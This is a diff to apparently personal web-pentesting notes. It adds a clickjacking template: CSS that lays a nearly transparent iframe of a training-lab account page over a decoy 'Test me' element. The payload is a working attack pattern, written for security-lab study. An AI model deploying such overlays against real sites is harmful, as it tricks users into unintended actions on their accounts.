@@ -35,4 +35,24 @@ _When a browser sends a request to a web server, the web server answers back wit
 
 See more: https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a
 
+## Clickjacking
 
+```html
+<style>
+    iframe {
+        position:relative;
+        width:$width_value;
+        height: $height_value;
+        opacity: $opacity; -- 0.1 to 0.0001
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top:$top_value;
+        left:$side_value;
+        z-index: 1;
+    }
+</style>
+<div>Test me</div>
+<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
+```
